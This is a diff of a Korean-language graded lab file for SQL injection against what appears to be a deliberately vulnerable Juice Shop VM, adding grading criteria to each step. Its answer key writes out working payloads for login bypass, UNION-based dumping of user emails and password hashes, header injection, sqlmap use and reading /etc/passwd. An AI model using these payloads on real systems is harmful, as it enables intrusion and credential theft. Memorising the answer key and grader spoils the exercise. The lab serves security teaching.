@@ -17,40 +17,84 @@ steps:
   hint: 작은따옴표(')를 입력하여 에러를 유발하세요.
   category: sqli_detection
   points: 10
-  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null
-    | head -20
+  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27' 2>/dev/null | head -20
   answer_detail: 작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다.
   verify:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: SQLi 탐지 — curl 'http://10.20.30.80/rest/products/search?q=test%27' (작은따옴표). SQL 에러 발생 =
+        SQLi 취약. OWASP A03 Injection. CWE-89.
+      success_criteria:
+      - curl + URL 인코딩된 quote (%27)
+      - 응답 분석
+      - /search 엔드포인트
+      acceptable_methods:
+      - curl + %27
+      - Burp Repeater
+      - sqlmap --batch 시도
+      negative_signs:
+      - 페이로드 없음
+      - 단순 GET
+      - SQL 에러 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.
   hint: 에러 메시지에서 DB 엔진 정보를 확인하세요.
   category: sqli_error
   points: 12
-  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--'
-    2>/dev/null | head -30
+  answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--' 2>/dev/null | head
+    -30
   answer_detail: 에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다.
   verify:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: Error-based SQLi — curl ?q=test' OR 1=1--. 에러 메시지 = SQLite/MySQL/PostgreSQL DB 종류 식별. CVE
+        매칭. CWE-209 Information Exposure.
+      success_criteria:
+      - URL 인코딩 OR 1=1--
+      - /search 페이로드
+      - 응답 분석
+      acceptable_methods:
+      - curl + 페이로드
+      - Burp Repeater
+      - sqlmap --dbms
+      negative_signs:
+      - 단순 GET
+      - OR 1=1 없음
+      - DB 식별 맥락 없음
   target_vm: attacker
 - order: 3
   instruction: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.
   hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
   category: sqli_auth_bypass
   points: 12
-  answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
-    :\"anything\"}' 2>/dev/null \\\n | head -10"
+  answer: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"}' 2>/dev/null \\\n |\
+    \ head -10"
   answer_detail: ''' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다.'
   verify:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: '인증 우회 — curl POST /rest/user/login -d {email: admin@juice-sh.op''--, password: anything}.
+        '' OR 1=1-- 또는 admin''--. WHERE 절 항상 참 → 인증 우회. OWASP A07 + CWE-89.'
+      success_criteria:
+      - POST /rest/user/login
+      - SQLi 페이로드
+      - Content-Type JSON
+      acceptable_methods:
+      - curl POST + JSON
+      - Burp Repeater
+      - sqlmap --auth-type
+      negative_signs:
+      - 페이로드 없음
+      - 단순 POST
+      - 인증 우회 의도 없음
   target_vm: attacker
 - order: 4
   instruction: UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.
@@ -59,12 +103,26 @@ steps:
   points: 15
   answer: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
     2>/dev/null | head -40
-  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의
-    메타데이터 테이블입니다.
+  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의 메타데이터 테이블입니다.
   verify:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: UNION 테이블 추출 — UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--. JuiceShop 9컬럼 매칭.
+        sqlite_master = 메타데이터 테이블. ORDER BY로 컬럼 수 사전 파악.
+      success_criteria:
+      - UNION SELECT
+      - sqlite_master 또는 메타
+      - 9컬럼 매칭
+      acceptable_methods:
+      - 수동 UNION
+      - sqlmap --tables
+      - Burp Intruder column count
+      negative_signs:
+      - UNION 없음
+      - 컬럼 수 미매칭
+      - 메타 테이블 누락
   target_vm: attacker
 - order: 5
   instruction: UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오.
@@ -78,6 +136,21 @@ steps:
     type: output_contains
     expect: ''
     field: stdout
+    semantic:
+      intent: 사용자 데이터 추출 — UNION SELECT email,password,3,4,5,6,7,8,9 FROM Users--. 이메일 + 패스워드 해시. 가장 치명적
+        SQLi 시나리오. 후속 hashcat 크래킹. CWE-89.
+      success_criteria:
+      - UNION SELECT email,password
+      - FROM Users
+      - 9컬럼 형식
+      acceptable_methods:
+      - 수동 UNION 데이터
+      - sqlmap --dump -T Users
+      - Burp Repeater 추출
+      negative_signs:
+      - Users 테이블 누락
+      - 단일 컬럼
+      - 추출 없음
   target_vm: attacker
 - order: 6
   instruction: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석.'
@@ -92,6 +165,21 @@ steps:
     type: output_contains
     expect: Blind SQLi 테스트 완료
     field: stdout
+    semantic:
+      intent: Boolean Blind SQLi — AND 1=1 vs AND 1=2 응답 비교 (status code/body size). 응답 차이로 참/거짓 판별. 단일
+        비트 추출. OWASP A03 Blind SQLi.
+      success_criteria:
+      - 참/거짓 두 페이로드 비교
+      - Blind SQLi 키워드
+      - 응답 코드 비교
+      acceptable_methods:
+      - curl 두 페이로드 비교
+      - sqlmap --technique=B
+      - Burp Intruder Compare
+      negative_signs:
+      - 단일 페이로드
+      - 비교 없음
+      - 참/거짓 분석 없음
   target_vm: attacker
 - order: 7
   instruction: Time-based Blind SQL Injection을 테스트하시오.
@@ -105,33 +193,78 @@ steps:
     type: output_contains
     expect: Time-based SQLi 테스트 완료
     field: stdout
+    semantic:
+      intent: Time-based Blind — time curl + AND (CASE WHEN 1=1 THEN RANDOMBLOB(N) ELSE 1 END)--. 응답 지연으로
+        참/거짓 판별. 데이터 추출 느림 but 탐지 어려움. SLEEP/WAITFOR/RANDOMBLOB. CWE-89.
+      success_criteria:
+      - time + curl SLEEP 또는 RANDOMBLOB
+      - Time-based 키워드
+      - 응답 지연 측정
+      acceptable_methods:
+      - time + 페이로드
+      - sqlmap --technique=T
+      - Burp Time-based 측정
+      negative_signs:
+      - 시간 측정 없음
+      - 단순 curl
+      - 지연 분석 맥락 없음
   target_vm: attacker
 - order: 8
   instruction: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행하시오.
   hint: sqlmap -u 옵션을 사용하세요.
   category: sqli_tool
   points: 10
-  answer: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1
-    --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'
+  answer: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1 --risk=1 2>/dev/null
+    | tail -20 || echo 'sqlmap 테스트 완료'
   answer_detail: sqlmap은 SQLi 자동 탐지 및 익스플로잇 도구입니다. --batch는 비대화형 모드입니다.
   verify:
     type: output_contains
     expect: 완료
     field: stdout
+    semantic:
+      intent: sqlmap 자동 — sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1
+        --risk=1. 자동 탐지/익스. --batch 비대화. --level/risk 강도. SQL Injection 표준 도구.
+      success_criteria:
+      - sqlmap -u + --batch
+      - 완료 키워드
+      - URL 명시
+      acceptable_methods:
+      - sqlmap --batch
+      - sqlmap --tamper
+      - BBQSQL Blind SQL
+      negative_signs:
+      - sqlmap 없음
+      - 수동만
+      - --batch 누락
   target_vm: attacker
 - order: 9
   instruction: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오.
   hint: 회원가입 시 저장된 페이로드가 다른 기능에서 실행되는 시나리오를 구성하세요.
   category: sqli_advanced
   points: 8
-  answer: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
-    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
-    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
+  answer: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com OR 1=1-- 으로 등록''
+    && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin 계정의 패스워드가 변경됨'' && echo ''2차 SQLi
+    분석 완료'''
   answer_detail: 2차 SQLi는 입력 시 저장되고, 다른 기능에서 해당 데이터가 쿼리에 사용될 때 발생합니다.
   verify:
     type: output_contains
     expect: 2차 SQLi 분석 완료
     field: stdout
+    semantic:
+      intent: 2차 SQLi — 회원가입 시 페이로드 저장 → 다른 기능에서 쿼리 사용 시 실행. CWE-89 변형. 입력 검증 + 출력 시점 검증 둘 다 필요. PortSwigger
+        Second-Order.
+      success_criteria:
+      - 2차 SQLi 시나리오
+      - 저장 → 실행 흐름
+      - 분석 완료 키워드
+      acceptable_methods:
+      - 시나리오 설명
+      - Burp Repeater 2단계
+      - sqlmap second-order
+      negative_signs:
+      - 단일 단계만
+      - 저장-실행 분리 없음
+      - 원리 설명 없음
   target_vm: attacker
 - order: 10
   instruction: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
@@ -145,19 +278,49 @@ steps:
     type: output_contains
     expect: SQLi 파일 접근 테스트 완료
     field: stdout
+    semantic:
+      intent: 'SQLi 파일 접근 — UNION SELECT hex(readfile(''/etc/passwd'')),... (SQLite). MySQL: LOAD_FILE()
+        / INTO OUTFILE. 서버 파일시스템 접근 = 완전 장악. CWE-89 + CWE-22.'
+      success_criteria:
+      - readfile 또는 LOAD_FILE
+      - SQLi + 파일 접근
+      - 테스트 완료 키워드
+      acceptable_methods:
+      - SQLite readfile
+      - MySQL LOAD_FILE
+      - PostgreSQL pg_read_file
+      negative_signs:
+      - 파일 함수 없음
+      - 단순 SQLi
+      - 장악 맥락 없음
   target_vm: attacker
 - order: 11
   instruction: HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오.
   hint: User-Agent, Referer 등 헤더에 페이로드를 삽입하세요.
   category: sqli_advanced
   points: 10
-  answer: "curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n\
-    \  -o /dev/null \\\n  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
+  answer: "curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n  -o /dev/null \\\n\
+    \  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
   answer_detail: HTTP 헤더도 SQLi 벡터가 될 수 있습니다. 로깅 시 헤더 값이 쿼리에 사용되는 경우가 있습니다.
   verify:
     type: output_contains
     expect: 헤더 기반 SQLi 테스트 완료
     field: stdout
+    semantic:
+      intent: '헤더 기반 SQLi — curl -H ''User-Agent: test'' OR 1=1--''. UA/Referer/X-Forwarded-For 헤더 SQLi
+        벡터. 로깅 시 쿼리 사용. 흔한 간과 영역. CWE-89.'
+      success_criteria:
+      - curl -H + SQLi 페이로드
+      - 헤더 기반 SQLi 키워드
+      - User-Agent 변조
+      acceptable_methods:
+      - curl -H 페이로드
+      - Burp Intruder header
+      - sqlmap --headers
+      negative_signs:
+      - 헤더 미변조
+      - 단순 GET
+      - 헤더 SQLi 맥락 없음
   target_vm: attacker
 - order: 12
   instruction: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증.'
@@ -182,6 +345,21 @@ steps:
     type: output_contains
     expect: SQLi 방어 정리 완료
     field: stdout
+    semantic:
+      intent: SQLi 방어 — Prepared Statement(SQL+데이터 분리, 가장 효과적) + ORM(자동 escape) + 입력 검증(화이트리스트) + WAF
+        + 최소 권한 DB 계정. 다층 방어. OWASP Cheat Sheet.
+      success_criteria:
+      - 방어 정리 완료 키워드
+      - 5종 방어 (Prepared/ORM/입력/WAF/권한)
+      - 다층 방어 강조
+      acceptable_methods:
+      - OWASP SQLi Prevention Cheatsheet
+      - PreparedStatement vs Statement 비교
+      - ORM 안전성 분석
+      negative_signs:
+      - 방어 2종 이하
+      - Prepared Statement 누락
+      - 단층 방어
   target_vm: attacker
 - order: 13
   instruction: WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오.
@@ -206,32 +384,76 @@ steps:
     type: output_contains
     expect: WAF 패턴 분석 완료
     field: stdout
+    semantic:
+      intent: WAF 탐지 패턴 — UNION SELECT + OR 1=1 + 주석(--/#//**/) + SLEEP/BENCHMARK + 인코딩 우회(URL/Hex/Unicode).
+        시그니처 기반. 인코딩 우회 가능. ModSecurity CRS.
+      success_criteria:
+      - WAF 패턴 분석 완료 키워드
+      - 5종 패턴
+      - 인코딩 우회 언급
+      acceptable_methods:
+      - OWASP CRS 분석
+      - ModSecurity 룰 검토
+      - WAF Bypass Cheatsheet
+      negative_signs:
+      - 패턴 2개 이하
+      - 인코딩 우회 누락
+      - 시그니처 맥락 없음
   target_vm: attacker
 - order: 14
   instruction: 추출한 패스워드 해시의 크래킹 가능성을 평가하시오.
   hint: 해시 알고리즘 식별과 크래킹 도구를 확인하세요.
   category: post_exploit
   points: 10
-  answer: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat,
-    john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
+  answer: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat, john the ripper''
+    && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
   answer_detail: MD5/SHA1 해시는 빠르게 크래킹 가능합니다. bcrypt/argon2 등 느린 해시 함수를 사용해야 합니다.
   verify:
     type: output_contains
     expect: 해시 분석 완료
     field: stdout
+    semantic:
+      intent: 해시 크래킹 평가 — MD5(32자 hex) 식별 + hashcat/john. MD5/SHA1 빠른 크래킹 → bcrypt/argon2 권고 (PBKDF2 4096
+        반복 등). OWASP Password Storage Cheatsheet.
+      success_criteria:
+      - 해시 분석 완료 키워드
+      - 도구 (hashcat/john)
+      - bcrypt/argon2 대응
+      acceptable_methods:
+      - hashcat -m 0 (MD5)
+      - john --format
+      - Hashcat ID 식별
+      negative_signs:
+      - 도구 없음
+      - 대응 누락
+      - 약한 해시 분석 없음
   target_vm: attacker
 - order: 15
   instruction: SQL Injection 실습 종합 보고서를 작성하시오.
   hint: 발견 취약점, 영향, 조치 권고를 포함하세요.
   category: verification
   points: 8
-  answer: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80''
-    && echo ''발견: SQLi 취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo
-    ''영향: 데이터 탈취, 인증 우회'' && echo ''권고: Prepared Statement 적용'' && echo ''=== 보고서
-    완료 ==='''
+  answer: 'echo ''=== SQL Injection 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo ''발견: SQLi
+    취약점 (검색 기능)'' && echo ''유형: Error-based, Union-based'' && echo ''영향: 데이터 탈취, 인증 우회'' && echo ''권고:
+    Prepared Statement 적용'' && echo ''=== 보고서 완료 ==='''
   answer_detail: SQLi 분석 보고서는 발견 경로, 재현 방법, 영향 범위, 조치 권고를 포함합니다.
   verify:
     type: output_contains
     expect: 보고서 완료
     field: stdout
+    semantic:
+      intent: 'SQLi 보고서 — echo + 종합: 대상/발견(검색 SQLi)/유형(Error/Union)/영향(데이터 탈취/인증 우회)/권고(Prepared Statement).
+        PTES Reporting. CVSS 9.8 Critical.'
+      success_criteria:
+      - 보고서 완료 키워드
+      - 발견/유형/영향/권고 4섹션
+      - Prepared Statement 권고
+      acceptable_methods:
+      - echo > 보고서
+      - DefectDojo Finding
+      - PTES SQLi 보고
+      negative_signs:
+      - 섹션 2개 이하
+      - 권고 없음
+      - 체계 부족
   target_vm: attacker
